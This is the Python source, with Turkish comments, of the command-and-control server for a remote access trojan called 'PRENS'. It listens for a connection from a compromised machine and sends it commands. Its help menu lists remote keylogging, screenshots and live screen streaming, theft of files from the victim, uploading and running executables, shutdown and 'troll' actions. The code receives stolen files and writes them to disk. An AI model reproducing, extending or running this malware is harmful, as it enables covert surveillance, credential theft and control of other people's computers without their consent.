import socket
import time
from colorama import Fore,Back,Style,init
import os


init()

def prens():
  print("""
        
        
    -----/\\------        
        /  \\
       /----\\
      /      \\  
     /        \\

        """)


def shell():
    print(Fore.RESET+'''
  EMİRLER
  
  
========          ========            =========
KOMUTLAR          AÇIKLAMA              KULLANIMI
==============        ==============      ================
  
DOSYA İŞLEMLERİ  
    ---------------------------
    touch:dosya oluşturur,  K:    touch dosyaadı.dosyauzantısı
    rm:dosya kaldırır,      K:     rm    dosya.adı.dosyauzantısı
    cd:dizin değiştirilmesini sağlar,  K: cd istenilen_dizin_ismi yada istenilen_dizin_yolu
    back:üst dizine gider,  K:    back
    cat:dosya okunmasını sağlar,  K: cat dosyaadı.dosyauzantısı
    change:bir dosyanın üzerine yazar,  K:  (change dosyaadı.dosyauzantısı), (yazdır=kendi dizinindeki dosyaadı.dosyauzantısı)
    ls:dizindeki dosyaları sıralar:,   K: ls
    pwd:çalışılan dizini  gösterir, K: pwd
    

İZLEME VE KAYIT
    ------------------
    screenshot: ekran görüntüsü alır, K: screenshot dosyaadı.png NOT: bulunduğun dizindeki konuma ss alır DİKKAT!
    screenshare: ekranı izlemeye başlar, K: screenshare
    stopscreen: ekran izlemeyi kapatır, K: stopscreen
    startklog:karşı sistemde keylogger başlatır,  K: startklog
    stopklog: keyloggerı durdurur,  K:stopklog
    
    
DOSYA YÜKLEME İNDİRME VE YÜRÜTME
      -------------------------
      sniff:karşı sistemdeki dosyaları indirir, K:sniff dosyaadı.dosyauzantısı
      send:karşı sisteme dosya gönder, K:send dosyaadı.dosyauzantısı
      open:karşı sistemdeki istenilen yürütülebilir dosyayı açar, K:open dosyaadı.dosyauzantısı
      url:web sitesi açar, K: url <url>
      
      
SES KOMUTLARI
  ------------------
  
  sesfull:sesi fuller, K: sesfull
  seskapat: sesi kapatır, K: seskapat
  playsound: karşı sistemde ses çalıştırır, K:playsound dosyaadı.mp3     #PROTOTİP
  
  
  
TROLL  
  ---------------------
    
    mesaj:ekrana istenilen mesajı bırakır, K:mesaj merhaba bu bir deneme yazısı       #PROTOTİP
    spam:masaüstünde dosya yada mesaj spamlar,K: 1=(spam mesaj deneme mesajı) 2=(spam dosya deneme.txt)   #PROTOTİP
    background:arkaplanı değiştirir, K: background dosyaadı_dosyauzantısı   #PROTOTİP
    shutdown: bilgisayarı kapatır,K: shutdown  
    
    NOT:bu komutlar sadece troll amaçlı değildir (:
  
  
SELF YIKIM :
  ---------------------

ruin:kendini yok eder,  K: ruin      NOT:bu sadece kendini yok eder diğer kalan kalıntıları rm komutu ile el ile temizlemeniz lazım   #PROTOTİP
        
          ''')



#dinleme--------------------------------------------------------
baglantı =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglantı.bind(("0.0.0.0",2505))
baglantı.listen(1)
prens()
print("sunucu dinleniyor")

client ,addr =baglantı.accept()
print(client,addr)

print("yardım için"+Fore.GREEN+" yardım "+Fore.RESET+"yazın")
#dinleme--------------------------------------------------------


#cmd-----------------------------------------------------------
while True:
#gönderilen------------------------------------------------------
  client.send("terminal".encode("utf-8"))
  terminal=client.recv(65536).decode("utf-8")
  emir=  input(Fore.RED+"PRENS>"+terminal+":")
  
  if not emir:
    continue
  
  if emir.startswith("yazdır"):
   
      dosya=emir.split()
      dosya=dosya[1]
      with open(dosya,"r") as file:
       içerik = file.read()       
      client.send("PRENSYAZDIR ".encode("utf-8")+içerik.encode("utf-8"))
      emir=""
       
  if emir=="yardım":
    shell()
        
  if emir =="nerdeyim":
    dosyalar=os.listdir(".")
    print(dosyalar)
    client.send("nerdeyimben".encode("utf-8"))
    emir=""
    
    
  if emir=="screenshare":
    try: 
     from vidstream import StreamingServer
     screen=StreamingServer("0.0.0.0",9090) 
     screen.start_server()
    except Exception as e:
      print(e)
      
      
      
  if emir.startswith("send"):
    senddosya=emir.split()
    senddosya=senddosya[1]
    client.send(f"sender {senddosya}".encode("utf-8"))
    time.sleep(2)
    with open(senddosya,"rb")as send:
      while chunk:=send.read(16384):
        client.send(chunk)  
    
    
  client.send(emir.encode("utf-8"))
  
#gönderilen----------------------------------------------




#gelen--------------------------------------------------
  gelenveri=client.recv(16384).decode("utf-8")
  
  if emir == "ls":
        try:
            client.settimeout(1.0)  # Zaman aşımı 2 saniye

            # Gelen dosya listesini al ve zaman aşımı kontrolü yap
            while True:
                try:
                    ls_verisi = client.recv(16384)  # Veri parçaları alınıyor
                    if not ls_verisi:
                        break  # Veri bitmişse çıkış yap
                    print(ls_verisi.decode("utf-8"))  # Gelen veriyi göster
                except socket.timeout:
                    print("Zaman aşımı, ls verisi gelmedi.")
                    break  # Zaman aşımı oluşursa döngüden çık
        except Exception as e:
            print(f"ls komutunda hata oluştu: {e}")
        finally:
            client.settimeout(None)
      
      

  if gelenveri.startswith("DOSYAGELDİ"):
    print("Dosya açılıyor.")
    filename = gelenveri.split()[1]

    try:
        # Soket zaman aşımını 10 saniye olarak ayarlıyoruz
        client.settimeout(2.0)  # 10 saniyelik timeout

        with open(filename, "wb") as dosya:
            while True:
                try:
                    data = client.recv(16384)  # 16KB'lık veri al
                    if not data or data == b"":  # Veri bitmişse
                        print("Veri bitti.")
                        break
                    
                    # Dosya transferi bitiş mesajı kontrolü
                    if data == b"dosyabittiemmi":
                        print("Dosya transferi tamamlandı.")
                        break

                    dosya.write(data)  # Veri yazma
                    print("Data yazılıyor...")
                
                except socket.timeout:
                    print("Zaman aşımı, veri gelmedi.")
                    break
                except ConnectionResetError:
                    print("Bağlantı istemci tarafından kapatıldı.")
                    break

        
        
    except Exception as e:
        print(f"Dosya kaydetme hatası: {e}")

    finally:
        # Soket zaman aşımını iptal ediyoruz, böylece başka işlemler için kullanılabilir
        client.settimeout(None)

    
    
    
  print(Fore.RESET+gelenveri)
#gelen-----------------------------------------------------------

#cmd-----------------------------------------------------------
